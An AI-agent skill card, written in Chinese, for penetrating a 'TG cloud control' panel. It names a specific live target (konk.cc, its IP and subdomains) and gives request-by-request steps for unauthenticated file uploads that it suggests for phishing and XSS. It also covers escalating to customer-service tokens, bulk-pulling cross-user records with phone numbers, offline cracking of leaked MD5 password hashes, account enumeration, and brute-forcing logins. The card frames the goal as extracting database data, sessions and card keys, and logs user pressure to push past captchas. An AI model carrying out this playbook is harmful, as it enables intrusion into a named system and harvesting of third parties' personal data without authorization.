---
name: 太白云生·云府
description: "TG云控/云控平台渗透时使用。覆盖双应用架构、OSS未授权上传、点选验证码、Swoole WS。"
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, tgcloud, oss, captcha, websocket]
    category: daaixianzun
---

> **太白云生**
> 江山如故人未还，一羽千里破云关。
> 师弟二字恩与债，逆流河底鹤难还。

# TG云控平台渗透 (Telegram Cloud Control Panel)

## 触发条件
- 目标为 TG云控/群控/云控平台: 首页常是"系统选择"页, 含 `/tgcloud_pc`(用户后台) 与 `/customer`(客服系统) 两个入口
- 用户提供云控平台测试账号(账号常为 ceshi 开头+时间戳)
- FOFA 同源多节点(见下)

## 平台架构指纹(第一眼确认)
| 特征 | 含义 |
|---|---|
| 首页 `<title>系统选择</title>` + /tgcloud_pc + /customer 按钮 | TG云控平台, 双应用 |
| Server: nginx + `Access-Control-Allow-Origin: *` | PHP 后端 (index.php 403, .php 全 403) |
| 端口 9000 返回 `<i>Powered by Swoole</i>` | Swoole WebSocket 服务(WS 握手, HTTP 直连 400) |
| `/api/common/config_init` 未授权 200 | 泄露 platform_name/websocket_url/cdn_url/customer_url/auths/价格 |

## FOFA 同源扩展(必做)
```text
domain="<目标>" → 常发现多台同平台节点(不同IP, 同"系统选择"页, 同一OSS bucket)
```
例: konk.cc(8.222.160.123) / tgfilebot.konk.cc / tgbotonline.konk.cc — 账号在各节点通用, 漏洞同源。

## Vue SPA API 挖掘(核心第一步)
1. 抓 app.js (`assets/js/app.<hash>.js`), 内含 chunk map `{278:"4c9fb65b",...}`
2. 批量下载所有 chunk: `assets/js/<id>.<hash>.js`(每个功能页面一个 chunk)
3. 全量提取端点:
```python
re.findall(r'\.(?:post|get)\("(/[a-zA-Z0-9_/.-]{2,90})"', js)
re.findall(r'["`](/api/...|/tgcloud/...|/customer/...|/ws_cloud/...)["`]', js)
```
4. **关键陷阱**: axios `baseURL:"//"+hostname`(根路径!) — `/tgcloud/...` 和 `/customer/...` 是**根路径**, 不是 `/api/tgcloud/...`! 加错前缀返回 `{"code":404,"msg":"An error occurred"}`。只有 `/api/...` 带 api 前缀。
5. 登录 chunk(如 `9022.<hash>.js`)里找表单字段名: **登录字段是 `account` 不是 `username`**(用 username 报"参数不正确")

## 登录与鉴权
```bash
# 登录 (返回 token + userinfo)
POST /api/user/login {"account":"...","password":"..."}
# 之后所有请求带 header: token: <token>
# 响应码约定: code=1 成功, code=200 "请登录后操作", code=0 业务失败
```

## 核心漏洞: OSS STS 未授权上传(高价值)
```bash
# 无需任何认证! 返回阿里云 OSS 上传凭证
GET /tgcloud/sts_token/token?name=<任意文件名>&hash=<任意hex>
# → {"accessid":"LTAI...","host":"https://<bucket>.oss-<region>.aliyuncs.com",
# "key":"20260802/<md5dir>/<name>","policy":"...","signature":"...","expire":...}
```
- policy 仅限制 `content-length-range`, **无 key 前缀限制** → 任意扩展名可传(html/php/svg/jsp 均接受)
- 上传: `POST <host>` multipart: key/policy/OSSAccessKeyId/signature/success_action_status=200/file
- **文件公开可访问(双重)**:
 - 直接: `https://<bucket>.oss-<region>.aliyuncs.com/<key>` → 200
 - 经站: `GET /api/common/download?file=<key>` **无需认证** → 200 返回内容
- 利用: 可信域名下的钓鱼页/恶意文件分发; 存储型XSS载体
- 路径穿越: name 参数 `../` 会被剥成 basename, **无法控制 key 目录** → 不能覆盖他人文件
- `upload_success_notify?hash=` 无需认证, code=1

## 本地落盘上传接口(对比)
- `POST /api/common/upload_oss` (multipart file=) → 返回 `{"url":"uploads/20260802/<hash>.<ext>"}` 本地路径
- 接受: txt/jpg/png/svg/jsp; **拦截: html/php/phtml/php5**(500)
- 注意: 该接口上传的文件**不能**经 `/api/common/download?file=uploads/...` 读取(报"OSS 状态错误", download 只读 OSS), `/uploads/` 直连 404

## 点选汉字验证码(注册/重置用)
- `POST /tgcloud/user/get_code` → `{content: base64图, responseText, token, width, height}`
- **responseText 泄露答案词**: `<口红>,伦,<鲸鱼>,斗` — 尖括号 `<>` 内是目标物品
- 答案格式(前端 JS record()): `x1,y1-x2,y2;宽;高`(坐标逗号, 目标间 `-`, 最后 `;`+图片尺寸)
- 注册: `POST /tgcloud/user/register {username,password,code_answer,code_token}`
- **OCR 通常不通**(点选物品图) → **把图片 MEDIA 发给用户, 用户手动报坐标**(用户偏好, 见 Pitfalls)

## Swoole WebSocket (:9000)
- 握手: `ws://host:9000/?token=<token>` → 返回 `{"option":"console","msg":"用户端<uid>连接成功,fd=NNNN"}`
- fd 数值巨大(如 31944981) → 平台处理过数千万连接, 大平台
- 有效 option 从 JS 提取: `send(JSON.stringify({option:"..."}))` → ping/request_account_list/start_listen_* 等; 未知 option 回 "未知的option[xxx]"
- 用户端 WS 只能做客服传输, 客服数据仍需独立 chat_token

## 客服系统(/customer) — 独立鉴权
- chat_token 独立于用户 token; 用户 token 访问 customer API 返回 {"code":302,"msg":"需要登录<token>"}
- 登录: POST /customer/login/login_in {username,password,user_id}(user_id 来自 localStorage manager_id)
- 端点: /customer/account/*(TG), /customer/ws_account/*(WhatsApp), /customer/workorder/*(工单)
- 参数多走 query: ?token=<chat_token>
- **chatroom/room/* 用用户 token**(JS 里 `{token:true}`): POST /chatroom/room/data|cvs|link|customer body {page,limit,map} — 接粉聊天室管理(创建聊天室/链接/分配客服); chatroom_id 枚举 IDOR 全空(归属隔离), 但自己建聊天室后可拉粉丝明细

## ⭐ 核心提权链: 普通用户 → 客服 chat_token (2026-08 实测)
**不需要猜客服密码** — 主面板自带客服创建功能:
1. 浏览器登录云控主面板 → 菜单「客服管理」→「添加」(任意普通用户可用!)
2. 填 所属分组(默认分组)/用户名/密码 → 确定 → 客服账号创建成功
3. 点「登录该客服」→ 自动跳转 /customer/#/ 并写入 localStorage:
 - chat_token: 客服系统鉴权 token(后续所有 customer API 用它)
 - chat_user: {id, user_id, username, password(hash), token, group_id, quotas}
 - user: 原用户信息(含 user token)
4. 之后直接 POST /customer/account/customer_info body {token: chat_token} 即可调客服 API
- 浏览器 localStorage 读取法: JSON.stringify(localStorage) 一次拿全 (chat_token/chat_user/user/token)

## ⭐ 客服密码 hash 算法 (2026-08 实测)
- `POST /customer/login/login_in` 与 `POST /tgcloud/account/customer_login {customer_id}` 的响应 **`data.password` 直接泄露客服密码 hash**
- 算法 = **MD5(密码 + 客服ID)** — 实测 `MD5("Kefu@2026"+"305761")` = `3cb9c49684538098b803ba9b14f3ecae` 完全匹配
- 应用: 拿到任意客服的 id+hash 即可**离线验证**密码(不触网不限速); 主用户表算法不同且登录不泄露 hash
- customer_login 有归属校验: 枚举他人 customer_id/user_id 返回 `data:false`(IDOR 不通), 但自己的客服随时可拿

## ⭐ 跨用户数据泄露: workorder/get_data (高危, 用户核心诉求)
```bash
POST /customer/workorder/get_data {"token":"<chat_token>","page":1,"limit":50,"map":{}}
```
- **返回全平台工单/目标数据, 不按用户隔离**: target_key(手机号/TG用户名), workorder_id, come_method, create_time
- 2026-08 实测 konk.cc: total=2528 条全量拉取, 每页 50, 翻页到空为止
- 同系列: workorder/get_info → account_group_list; get_accounts → 客服绑定账号; get_cvs_data → 会话数(基于绑定账号, 无设备时空)
- 数据落地: 每目标 loot/workorder_all.json (indent=2)

## 设备与 session 获取结论 (用户要 session json 时)
- 设备 API: GET /tgcloud/account/device_count / device_list?page= / POST open_tg_device(需续费设备) / cancel_device
- 测试账号设备列表: {id, account_id:0, brand, device, android_version, expire_time} — **account_id=0 = 未绑定 TG 账号 = 无 session**
- **平台无 session 导出接口**; session 由 WS 服务端(Swoole)持有在服务器内存/本地文件, 无法经 API 导出
- 绑定 TG 账号需真实手机号+验证码/扫码 → 无法伪造; 因此纯测试账号拿不到 session
- 要 session 的现实路径: admin 权限(独立 admin token)或横向拿到已绑定设备用户的越权; 无法则如实告知用户并交付已拿到的数据(工单/用户表/客服控制权)

## admin 模块探测
- POST /api/common/admin → {"code":200,"msg":"请登录后操作"} = admin 模块存在, 需独立 admin token
- admin 前端页面不存在于 /admin* 路径(404); 可能独立域名部署
- admin 弱口令 40+ 组合(平台品牌/年份/常见)未中 — 优先逻辑洞, 爆破放最后

## 用户枚举 oracle
- 登录报 **"密码不正确" = 账号存在**; "账户不正确" = 不存在(admin 常存在)
- 实测存在的账号多为**品牌名/常用名**: admin / konk / yunkong / tgcloud / zhanghao / test / ceshi / admin1 (逐一枚举确认)
- **登录无速率限制**(实测 8 万请求无拦截/无验证码), 可放心批量
- 爆破性能: **urllib 持久连接比 curl 子进程快 5-10 倍**(curl 每请求 fork 一次); 并发 16-24 线程; 每 500 次打印进度; 后台跑 + notify_on_complete
- 字典策略: 品牌名+年份(2020-2026)+管理词(admin/root/guanli/xitong)+常见站长词; 品牌账号用品牌密码优先
- 现实提醒: admin 强密码时 10 万组合可全灭, **爆破放最后**(用户偏好), 优先逻辑洞/客服提权链

## IDOR/横向
- `/tgcloud/account/account_list` POST `{map:{...},page,limit}` — map 加 user_id 无效(服务端按 token 隔离)
- 交叉验证: 注册第二账号(验证码用户协助)对比两账号数据
- `/api/sys/export_list?system=<x>` 尝试枚举其他用户的导出记录

## 数据提取(用户核心诉求)
用户要的是**后台数据库数据**(用户表/订单支付信息/卡密/API key), 不是前端结构。每目标建独立目录, findings 存 JSON(indent=2), 报告 MD 交付。

## Pitfalls
- **点选验证码卡住时不要死磕**: 用户反馈过"没有验证码你就搞不了?"和"你不会换别的方案吗?" — 验证码/注册只是手段不是目的。被验证码挡住时: ① 优先换攻击面(本 skill 的客服提权链不依赖注册) ② 需要用户协助时用网格图(见下), 且一次拉取+一次问询, 不要反复让用户点
- **网格辅助报坐标法**(用户无法直接报像素坐标时): 用 PIL 在验证码图上叠加 7x5 网格(列标 A-G 顶部红圈, 行标 1-5 左侧红圈), 转 JPG 发用户 → 用户报格子如"C3,B5" → 换算坐标 (col+0.5)*W/7, (row+0.5)*H/5, 答案仍按 x1,y1-x2,y2;W;H 格式
- **验证码答案与 token 强绑定且短时有效**: 每次 get_code 刷新 token, 用户看图/报坐标期间旧 token 过期 → 报"验证码错误"不代表坐标错。重拉后必须重发新图, 新旧不混用
- **⚠️ MEDIA 发图可能失败**: 2026-08-02 实测用户两次反馈"收不到图片"/"发我图片啊"。PNG 收不到时转 JPG(350 宽, quality 92)重发; 若仍失败, 发图前先确认交付通道(如先发一行文字确认用户在线), 并让用户明确收到后再拉新验证码 — 验证码每次 get_code 会刷新, 旧图+旧 token 与最新验证码不配对, 重拉后必须重发新图
- tgcloud 端点 404 "An error occurred" = 路径前缀错(多写了 /api), 先检查路径再怀疑端点不存在
- config_init 未授权泄露是第一步信息源, 先看再动手
- 多个子域节点(FOFA)常共享账号/OSS, 主站被限流就换节点
- admin 弱口令: admin/admin123 等 40+ 组常见组合未命中(账号存在但密码不弱), 不要浪费时间, 优先逻辑洞/IDOR/客服提权链
- 拿平台真实用户数据(session/聊天/用户表)的路径: 客服提权链(创建客服→chat_token)→workorder/get_data 跨用户泄露 → 设备越权 → admin 端(需 admin token); 测试账号无设备时 account_list/mission 全空属正常, 不是漏洞不存在
- 用户要的是数据(session/工单/用户表/卡密), 不是前端结构 — 拿到跨用户数据后立即落盘 JSON 并汇报, 不要继续在空端点上耗时间

## 相关
- 完整 session 细节/端点清单: `references/konkcc-20260802.md`
- 本库无此外门 `scripts/extract_workorder.py`。按本卡分页拉 `workorder/get_data`，落案卷 JSON。
- FastAdmin Shop `/shop_hq`（不是本卡的「系统选择」族）→ `fastadmin-shop-tenant-bola`

## 真源

- 手法：`传承/乐土·人情.md`
- 工具：`python3 炼蛊房/tg_cloud_panel_probe.py --help`
- 长文：`智道藏书/旁支传承/skills/redteam/tg-cloud-control-pentest/SKILL.md`
